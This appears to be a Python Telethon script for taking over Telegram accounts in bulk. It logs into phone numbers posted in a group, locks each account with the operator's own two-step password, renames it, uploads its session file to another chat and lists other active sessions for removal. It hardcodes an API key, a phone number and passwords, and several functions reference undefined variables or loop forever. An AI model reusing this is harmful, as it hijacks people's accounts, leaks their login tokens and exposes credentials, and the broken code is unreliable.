import time
import pickle
import os
import requests
import random
import shlex
import subprocess
from telethon import TelegramClient, events, sync, functions
from telethon.tl.functions.account import UpdateProfileRequest
import telethon.tl.types
#from telethon.tl.types import ChannelParticipantsPending
from selenium_authenticated_proxy import SeleniumAuthenticatedProxy

from datetime import datetime, timedelta

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC


from selenium.webdriver import Chrome, ChromeOptions

pic_id = "no"


api_id = '16017675'
api_hash = '898e9db01786302c9f95f67c23d9fecb'
phn = "+8801772525830"
pswd = "khALid@542543"
pass_2fa = "542543"

cwd = os.getcwd()

ssn_path = cwd + '\\me.session'

grpUNAM = "ksp_tg"

def s_check(client):
    print(client.get_me().phone)
    client.session.close()
    client.session = None
    client = None

def get_pending_participants(client, group_id):
    """
    Retrieves all pending participants (joining requests) for a group.

    Args:
        client: The Telethon client object.
        group_id: The ID of the group.

    Returns:
        A list of user entities representing the pending participants.
    """
    pending_participants = []
    offset = 0
    limit = 100  # Limit for fetching participants
    while True:
        result = client.get_participants(
            group_id,
            filter=None,
            limit=limit
        )
        print(f"{result}\n\n")
        #if not result.users:
            #break
        #pending_participants.append(result.users)
        #offset += len(result.users)
    return pending_participants

# Example usage (assuming you have a client object and a group_id):
# async with TelegramClient(...) as client:
#     group_id = 123456789  # Replace with the actual group ID
#     pending_users = await get_pending_participants(client, group_id)
#     for user in pending_users:
#         print(f"Pending user: {user.first_name} {user.last_name} ({user.id})")


def kill_others(client):
    me = client.get_me()
    print(me.phone)
    GetSessions = client(functions.account.GetAuthorizationsRequest()) 

    if len(GetSessions.authorizations)>1:
        print("Another Session    :\tYes")
        for ss in GetSessions.authorizations:
            SessionHash = ss.hash
            SessionIp   = ss.country
            d_mdl       = ss.device_model
            
            print(f"{d_mdl}\n{str(SessionHash)}\n{str(SessionIp)}\n{ss.date_created}\n\n") 
            if SessionHash>0:
                #result = client(functions.account.ResetAuthorizationRequest(hash=SessionHash))
                print(f"{d_mdl}   :\t {str(SessionIp)}") 
    else:
        print("Another Session    :\tNo")
    
    client.session.close()
    client.session = None
    client = None
    time.sleep(2)


def get_otp_code(phn):
    code = input(f'{phn} - OTP: ')
    #code_callback=get_otp_code(session_phn),
    return code
    
    
    

def rand_num(rng):
  """Generates a random 8-digit number as a string."""
  return ''.join(random.choice('0123456789') for _ in range(rng))



def f_nm_cng(client):
        
    
    me = client.get_me()
    # Generate and print the random 8-digit number
    f_name = me.phone[3:] + '_' +rand_num(3) + '_KSP'
    print(f_name)
    # Update the first name
    try:
        client(UpdateProfileRequest(first_name=f_name))
        print(f"First name changed to: {f_name}")
        print(f'Logged in as {me.first_name}')

    except Exception as e:
        print(f"An error occurred: {e}")
        exit()

def session_2fa(mClient, msg):

    msgID = message.id
    senderUID = mClient.get_entity(message.from_id.user_id).username
    session_phn = msg.message
    
    print(f'Sending OTP for #  {session_phn}')
    
    client = TelegramClient(session_phn, api_id, api_hash).start(phone=session_phn,password=pass_2fa,max_attempts=10)

    me = client.get_me()
    print(f'Logged in as {me.phone}')

    result = client(functions.account.GetPasswordRequest())
    #print(result.has_password)

    if not result.has_password:
        print("no 2fa")
        
            
        try:
            client.edit_2fa(new_password='542543',hint='5****3')
            print("2FA has been successfully enabled.")
            
        except Exception as e:
            print(f"An error occurred: {e}")

    if result.has_password:
        print("has 2fa")
        
    
    ssn_path = cwd + '\\' + session_phn + '.session'
    cptn = session_phn + '_' + senderUID
    
    send_session(mClient, ssn_path, 'ksp_stg', 'snd_msg_grp', cptn)
    f_nm_cng(client)
    
    client.session.close()
    client.session = None
    client = None
    mClient.send_message('@'+grpUNAM, message=senderUID, reply_to=msgID)
    

"""
email="my_test_email@example.com",
email_code_callback=get_code_manually()
"""

def get_otp(client, do_func):
    today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0).date()
    tomorrow = today + timedelta(days=1)
    
    if (do_func == "allMonth"):
        today = today.strftime("%Y-%m")
    print(today)
    
    
    #date_string = "2025-05-16"
    #date_format = "%Y-%m-%d"  # Year-month-day format
    #date_object = datetime.strptime(date_string, date_format).date()
    #print(date_object)
    #print(date_object.isoformat())
    
    
    lgrp_id = client.get_entity(chat_nam)
    grp_id = lgrp_id.id
    print(f"Group: {grp_id}")
    
    messages = []
    for message in client.get_messages(grp_id, limit=90000000000500):
        
        msg_date = message.date.replace(hour=0, minute=0, second=0, microsecond=0).date()
        
        if (do_func == "allMonth"):
            msg_date = msg_date.strftime("%Y-%m")
        print(msg_date)
        
        
        if (
              msg_date == today and
              message.text and
              str(prof_num) in message.text
           ):
            messages.append(message.text.split('_')[1].lstrip().split('_')[0])
            
            print(f"This Month pic Ids : {message.text.split('_')[1].lstrip().split('_')[0]}")
    return messages

def send_session(client, file_path, uid, func_do, capt=None):
    
    if (func_do == 'snd_msg_grp'):
        
        #t_msgs = get_t_pic_ids(client, 'ksp_stg', i_n, '')
        print("prepairing grp msg")
        #if not t_msgs:
        client.send_file(uid, file_path, caption=capt)
        print("Session sent successfully")
        return
    
    
    
    for message in client.get_messages(grp_id, limit=90000000500):
        #if message.document:
        #client.download_media(message)
        if (
              hasattr(message, 'media') and
              hasattr(message.media, 'document') and
              hasattr(message.media.document, 'mime_type') and
              message.media.document.mime_type == 'image/jpeg' and
              message.from_id.user_id == user_obj.id
          ):
              #print(f'{message.from_id.user_id} : {message.media.document.id}')
              pic_list.append(message)
              
    #pic_id_trim = name.split('_')[1].lstrip().split('_')[0]
    if pic_list:
        
        d_pic_ids = get_t_pic_ids(client, 'robi_att', i_n, 'allMonth')
        
        if d_pic_ids:
            pic_list = [item for item in pic_list if item not in d_pic_ids]
        
        pic_data = random.choice(pic_list)
        global pic_id
        pic_id = pic_data.media.document.id
        print(f"{pic_data.media.document.id}")
        
        #return pic_data
        client.download_media(message=pic_data , file='pp.jpg')
    else:
        print(f"no more pics please upload new pic")
        exit()
    
    

def get_telegram_messages(token, chat_id):
    url = f"https://api.telegram.org/bot{token}/getUpdates"
    response = requests.get(url)
    data = response.json()
    pic_list = []
    for update in data['result']:
        if 'message' in update and 'chat' in update['message'] and 'document' in update['message'] and update['message']['document']['mime_type'] == 'image/jpeg' and str(update['message']['chat']['id']) == str(chat_id):
            file_id = update['message']['document']['file_id']
            pic_list.append(file_id)
    return pic_list

def send_photo_telegram(bot_token, chat_id, photo_path, caption=None):
    """
    Sends a photo to a Telegram chat.

    Args:
        bot_token (str): The API token of your Telegram bot.
        chat_id (int or str): The ID of the chat to send the photo to.
        photo_path (str): The path to the photo file.
        caption (str, optional): The caption for the photo. Defaults to None.
    """
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    
    with open(photo_path, 'rb') as photo_file:
        files = {'photo': photo_file}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data)
    
    return response.json()


now = datetime.now()

date_time = now.strftime("%m/%d/%Y, %H:%M:%S")

"""
if os.path.exists(cam_path):
    os.remove(cam_path)
    print(f"File '{cam_path}' deleted successfully.")
else:
    print(f"File '{cam_path}' does not exist.")
    
clientMain = TelegramClient('n_agwnt', api_id, api_hash).start(phone=phn,password=pswd,max_attempts=10)

t_msgs = get_tg_num(clientMain, 'ksp_tg', '1772525830', '')
if t_msgs:
    print("Already Done for today")
    exit()


client = TelegramClient('+8801605161729', api_id, api_hash).start()


with TelegramClient('+8801338959663', api_id, api_hash) as client:
    result = client(functions.account.ResetAuthorizationRequest(hash=-12398745604826))
print(result)


for file in os.listdir(cwd):
    if file.endswith(".session") and file.startswith("+8801"):
        print(file)
        client = TelegramClient(file, api_id, api_hash).start(password=pass_2fa,max_attempts=10)
        s_check(client)
        #kill_others(client)
        #f_nm_cng(client)
        #print(os.path.join(cwd, file))
        
exit()


#client = TelegramClient('+8801605161729', api_id, api_hash).start()
#client = TelegramClient('+8801609691123', api_id, api_hash).start()
#kill_others(client)
#exit()


client = TelegramClient('n_agwnt', api_id, api_hash).start(phone=phn,password=pswd,max_attempts=10)

usr_re = client.get_entity("ksp_test1")
print(usr_re)

grp_id = client.get_entity("ksp_test").id  # Replace with the actual group ID
print(grp_id)

user_list = client.get_participants(entity=grp_id)
for _user in user_list:
    print(f"\n\n{_user}")
#for user in pending_users:
    #print(f"Pending user: {user.phone}")
exit()


"""
all_nums = []

client = TelegramClient('n_agwnt', api_id, api_hash).start(phone=phn,password=pswd,max_attempts=10)
for message in client.get_messages('@'+grpUNAM, limit=90000000000000):
    
    if (
          message.replies and
          hasattr(message.replies, 'replies') and
          message.replies.replies == 0 and
          message.message.startswith("+880")
      ):
          senderUID = client.get_entity(message.from_id.user_id).username
          if (senderUID):
              print( f"{senderUID}" )
              session_2fa(client, message)
print("All Sessions are sent successfully")



"""

 and
          hasattr(message.reactions.MessageReactions, 'results') and
          hasattr(message.reactions.MessageReactions.results, 'ReactionCount') and
          hasattr(message.reactions.MessageReactions.results.ReactionCount, 'reaction')
          
          
t_msgs = get_t_pic_ids(client, 'robi_att', i_n, '')
if t_msgs:
    print("Already Done for today")
    exit()

dl_pic(client, usr_nam, 'ksp_pro', 'dl')
"""


#dl_pic(client, usr_nam, 'ksp_pro', 'snd_msg_grp', caption)

exit()

    
